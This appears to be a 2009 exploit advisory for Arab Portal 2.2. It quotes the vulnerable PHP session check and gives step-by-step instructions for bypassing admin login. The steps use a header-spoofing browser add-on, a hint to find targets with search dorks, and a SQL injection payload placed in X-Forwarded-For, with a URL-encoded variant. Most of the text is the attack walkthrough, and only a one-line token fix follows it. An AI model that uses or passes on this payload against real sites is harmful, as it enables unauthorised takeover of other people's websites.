@@ -1,0 +1,105 @@
+# Script Name : Arab portal 2.2 Remote Auth SQL Bypass Vulnerabilitiy
+
+# Script  home : http://www.arab-portal.info/arabportal_22.zip
+# Exploit risk level : High
+# Found By : RoMaNcYxHaCkEr  [RXH]        
+# Written By : Sniper Code    [S.C.T - 443 ]
+# Our home :  WwW.Sec-Code.CoM  [Security - Codes TeaM]   
++======================================================================================================================+
+
+# Introduction About Vulne :
+
+the Control Panel Is Depending on Session In MySQL Also By Cookies But by Default  it Is Session ...
+
+See This Line 192 of this File [admin/aclass/admin_func.php]:
+
+         $result  = $apt->query("SELECT sessIP from  rafia_admin_sess where  sessID='$sessID' and sessIP='$sessIP' and sess_TIME<'$expsess'");
+
+When You Injected The Header To Get XPL SQL Injection By Simple Injected And Success The Login In This SQL Query
+
+# Vulne Line 192 In File [admin/aclass/admin_func.php]: :
+
+function is_login()
+     {
+         global $apt;
+        
+         $sessID  = $this->get_sessID();
+         $sessIP  = $apt->ip;
+         $expsess = $apt->time + $this->expsess;
+
+         if($this->use_pre_ip == 1){$r_ip = explode('.',$sessIP); $sessIP = $r_ip[0].'.'.$r_ip[1].'.'.$r_ip[2];}
+
+         $result  = $apt->query("SELECT sessIP from  rafia_admin_sess where  sessID='$sessID' and sessIP='$sessIP' and sess_TIME<'$expsess'");
+
+         if ($apt->dbnumrows($result) > 0)
+         {
+                 $apt->query("update rafia_admin_sess set sess_TIME='".$apt->time."' where  sessID='$sessID'");
+                return true;
+         }
+         else
+         {
+             return false;
+         }
+     }
+
+we can exploit this . .
+
+# and now the Exploit  is:
+
+-First : Install This Tool :
+
+https://addons.mozilla.org/en-US/firefox/addon/5948
+
+it is [ X-Forwarded-For Spoofer tool]
+
+You Can Inject Also Client-ip Also Is Infected In Header
+
+-second : find site by using dork : plz use your mind ^_^
+
+ok now Go To Admincp e.g. :
+
+http://localhost/arabportal_22/admin/
+
+http://sniper code/path/admin/
+
+Then Write This Code In Tool [from Firefox ===> Tools====> X-Forwarded-for Spoofer]
+
+put this code :
+'/**/union/**/select/**/0/*
+
+And  select Enable for tool . . .
+
+Now Refresh Twice ..and you will be In admin Control Panel ^_^
+
+I Am Tired For Written Exploit For This Bug ...
+
+and You Can Code It,s . .
+
+If You Have Problem With Magic_quat  in php version Encode To URL Like This :
+
+%27%2F%2A%2A%2F%75%6E%69%6F%6E%2F%2A%2A%2F%73%65%6C%65%63%74%2F%2A%2A%2F%30%2F%2A
+
+and also you will be in admin control panel. . . .
++================================================================================================================+
+
+# Solution :
+
+Protect The Admin cp By using Firewall Or Change The Login Manner :)
+
+thats it . . .
+
+[+]
+done by :sniper code and rxh . .
+
+[+] Greetz to :
+
+           [»] The members in our home [  WwW.Sec-Code.CoM  - - ]
+           [»] [Snake1095 - aLwHEeD - AlH7nOOtY - aB0-3tH4b T3rR0r - HXH - -]
+           [»][MN9 - S4S-T3rr0r!sT -G0D-F4Th3r- SnIpEr_h - Cyb3R-1sT - siana - jiko - -]
+           [+] [members of WwW.tryag.cc/cc - -]
+
+
+
+-==========================================[ ViVa Crazy Coderz rxh - S.C.T ]====================================-
+
+# milw0rm.com [2009-05-29]
